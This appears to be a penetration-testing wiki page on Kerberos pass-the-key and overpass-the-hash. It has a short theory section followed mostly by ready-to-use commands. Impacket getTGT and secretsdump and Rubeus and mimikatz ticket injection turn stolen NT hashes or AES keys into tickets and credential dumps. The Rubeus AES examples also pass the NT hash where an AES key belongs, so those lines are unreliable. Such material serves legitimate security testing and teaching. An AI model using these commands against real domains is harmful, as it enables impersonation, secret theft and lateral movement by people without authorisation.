# Pass the key

## Theory

An attacker knowing a user's Kerberos key can use it to obtain Kerberos tickets and authenticate to remote services.

Kerberos offers 4 different key types: DES, RC4, AES-128 and AES-256.

* When the RC4 etype is enabled, the RC4 key can be used. The problem is that the RC4 key is in fact the user's NT hash. Using a an NT hash to obtain Kerberos tickets is called **overpass the hash**.
* When RC4 is disabled, other Kerberos keys \(DES, AES-128, AES-256\) can be passed as well. This technique is called **pass the key**. In fact, only the name and key used differ between overpass the hash and pass the key, the technique is the same.

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [getTGT](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py) \(Python\) can request a TGT \(Ticket Granting Ticket\) given a password, hash \(`LMhash` can be empty\), or aesKey. The TGT will be saved as a `.ccache` file that can then be used by other Impacket scripts.

```bash
# with an NT hash (overpass-the-hash)
getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET

# with an AES (128 or 256 bits) key (pass-the-key)
getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET
```

Once a TGT is obtained, the tester can use it with the environment variable `KRB5CCNAME` with tools implementing [pass-the-ticket](pass-the-ticket.md).

An alternative to requesting the TGT and then passing the ticket is using the `-k` option in Impacket scripts. Example below with secretsdump.

```bash
secretsdump.py -k -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET
```
{% endtab %}

{% tab title="Windows" %}
On Windows, requesting a TGT can be achieved with [Rubeus](https://github.com/GhostPack/Rubeus) \(C\#\). The ticket will be injected in the session and Windows will natively be able to use these tickets to access given services.

```bash
# with an NT hash
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NThash /ptt

# with an AES 128 key
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes128:$NThash /ptt

# with an AES 256 key
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$NThash /ptt
```

An alternative to Rubeus is [mimikatz](https://github.com/gentilkiwi/mimikatz).

```bash
# with an NT hash
sekurlsa::pth /user:$USER /domain:$DOMAIN /rc4:$NThash /ptt

# with an AES 128 key
sekurlsa::pth /user:$USER /domain:$DOMAIN /aes128:$aes128_key /ptt

# with an AES 256 key
sekurlsa::pth /user:$USER /domain:$DOMAIN /aes256:$aes256_key /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](pass-the-ticket.md#injecting-the-ticket).
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://blog.notso.pro/2020-05-09-offops-in-ad-1/" caption="" %}

{% embed url="http://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash" caption="" %}

{% embed url="https://blog.stealthbits.com/how-to-detect-overpass-the-hash-attacks/" caption="" %}

